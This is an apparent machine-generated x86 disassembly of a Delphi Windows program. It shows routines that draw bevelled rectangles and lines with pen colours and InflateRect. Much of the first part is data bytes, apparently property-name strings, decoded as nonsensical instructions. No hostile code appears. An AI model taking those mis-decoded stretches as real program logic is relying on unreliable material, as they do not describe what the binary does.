add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax - 0x1 ] bl
inc edx
add [ eax ] dl
jb r-xdata
add [ eax + ebx + 0x3480043 ] ch
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc esp
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
shr [ eax + 0x70042e7 ] 0x11
push esp
inc ebx
jne r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + 0x5d ] ah
inc ebx
add al al
add al 0x43
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x430458ff ]
add [ eax - 0x53ffbcfc ] bl
add al 0x43
add ah al
add al 0x43
add [ eax + eax ] dh
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add ah dh
pop esp
inc ebx
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax + 0x5d ] dl
inc ebx
add [ edi + 0x3b640044 ] dh
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax + 0x14 ] 0xffffff89
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al ch
inc [ edx ]
cld
test al 0x34
inc eax
add [ edi + eax * 2 ] ah
jb r-xdata
mov eax 0x1100043
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
pop es
dec edi
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
mov ecx 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] dh
inc edx
add [ eax + 0x240042e7 ] dl
add al [ eax ]
mov edx 0x1f00043
add bh bh
[ eax ] eax
push ebp
jo r-xdata
inc esp
je r-xdata
test al 0x34
inc eax
add [ edi + eax * 2 ] ah
je r-xdata
jbe r-xdata
inc esp
jb r-xdata
je r-xdata
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
adc [ ecx ] al
jns r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add ah dh
pop esp
inc ebx
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax + 0x5d ] dl
inc ebx
add [ edi + 0x3b640044 ] dh
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax + 0x14 ] 0xffffff89
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add ah ch
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov al [ 0xfffffffff00042e6 ]
sbb [ ebx ] eax
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al ch
inc [ edx ]
cld
jbe r-xdata
inc ecx
add [ eax + 0x24004034 ] ch
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
test al 0xe7
inc edx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc edi
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
adc [ bp + si + 0x43 ] bh
[ eax ] eax
push eax
add [ eax ] eax
je r-xdata
add al bh
add [ eax ] al
lodsd [ esi ]
inc ebx
add [ ebx ] bl
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + 0x5d ] ah
inc ebx
add al al
add al 0x43
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
cld
call 0xb49e940
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
sbb al 0xe8
inc edx
add [ edi + 0x2f0042 ] ah
or [ ebp + 0x78 ] al
je r-xdata
inc edi
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx + eax + 0x43 ] al
add [ eax + edi * 8 + 0x2580043 ] dl
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
outsd
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x60 ] bp
out 0x42 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42e7 ] ch
dec edi
outsd
arpl [ ebx + 0x74 ] bp
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax - 0x1 ] bl
inc edx
add [ eax ] dl
jb r-xdata
insb
jae r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
outsb
jae r-xdata
add dh bh
call sub_432d75
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
insb
jae r-xdata
add [ eax + ebp * 8 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
call sub_42e828
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
call 0x26ae838
add [ eax ] al
push esp
out 0x42 al
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
jmp [ ebp * 2 + 0x6d480044 ]
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
add [ ecx ] ah
add bh bh
sbb bh dh
inc ebx
add [ edi + esi * 8 + 0x43 ] dh
add bh bh
fdivr st0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ ebp + ebp * 4 + 0x5b0043 ] bl
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xor ah 0xff
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
adc [ eax ] al
sbb al 0x2
add bh bh
mov esp 0x1004302
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_42e828
inc esp
add al [ ebx ]
xchg esp eax
clc
inc ebx
add [ eax + 0x2 ] bl
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax - 0x1 ] bl
inc edx
add [ eax ] dl
jb r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add ah dh
pop esp
inc ebx
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax + 0x5d ] dl
inc ebx
add [ edi + 0x3b640044 ] dh
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax + 0x14 ] 0xffffff89
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
lodsd [ esi ]
inc ebx
add [ ebx ] bl
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + 0x5d ] ah
inc ebx
add al al
add al 0x43
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
cld
call 0xb49e940
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
sbb al 0xe8
inc edx
add [ edi + 0x2f0042 ] ah
or [ ebp + 0x78 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
outsb
jae r-xdata
add dh bh
call sub_432d75
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
insb
jae r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
jmp [ ebp * 2 + 0x6d480044 ]
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
add [ ecx ] ah
add bh bh
sbb bh dh
inc ebx
add [ edi + esi * 8 + 0x43 ] dh
add bh bh
fdivr st0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ ebp + ebp * 4 + 0x5b0043 ] bl
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xor ah 0xff
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
adc [ eax ] al
sbb al 0x2
add bh bh
mov esp 0x1004302
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_42ecc7
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
js r-xdata
push ebx
je r-xdata
dec esp
mov eax 0x1180043
push eax
outsd
jo r-xdata
adc al ch
loopne r-xdata
jb r-xdata
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
inc eax
inc ebp
loopne r-xdata
inc esp
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
and [ edi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
mov eax 0xe80043
add bh bh
call 0x241ed11
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
jb r-xdata
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
jns r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
adc al ch
xchg esi eax
inc ebp
dec [ ebx + 0x508b0845 ]
or al 0x8b
inc ebp
or [ ebx + 0x408bf840 ] cl
inc esp
jb r-xdata
outsd
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
jns r-xdata
jo r-xdata
mov ecx 0x2
call sub_423bc8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423440
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423bc8
pop ebx
mov esp ebp
pop ebp
retn
fmul [ ebx + 0x408b0845 ]
clc
lea eax [ bx + si ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
je r-xdata
bound ebp [ ebp + 0x4c ]
jns r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
mov eax [ eax + 0x10 ]
call sub_423440
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
inc eax
clc
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
sub_42ee28
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423440
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423bc8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423440
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423bc8
pop ebx
mov esp ebp
pop ebp
retn
sub_42eeec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_42354c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42ee28
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42ef4c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_447e2c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_43fb80
mov edx 0x32
mov eax esi
call sub_43fba4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42eff0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423440
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_418ddc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_418ddc
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_418ddc
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_423bc8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_423440
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_418ddc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_418ddc
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_418ddc
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_423bc8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f0e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_423440
mov ecx edi
mov edx esi
mov eax ebx
call sub_423b9c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_423b3c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42f120
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_42354c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_42351c
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_423500
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423440
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_42383c
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_42351c
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_423500
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_423440
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_42383c
mov eax [ ebp - 0x4 ]
call sub_43fdc8
push eax
mov eax [ ebp - 0x4 ]
call sub_43fe0c
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_423c00
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42f212 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_418e04
lea eax [ ebp - 0x1c ]
call sub_42eff0
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_418e04
lea eax [ ebp - 0x1c ]
call sub_42eff0
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_418e04
lea eax [ ebp - 0x1c ]
call sub_42eff0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f0e0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42f0e0
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f0e0
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42f0e0
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f0e0
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_42f0e0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42f0e0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_42f0e0
pop ecx
sub_42f3a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fbd8
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42f430
call sub_420d24
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
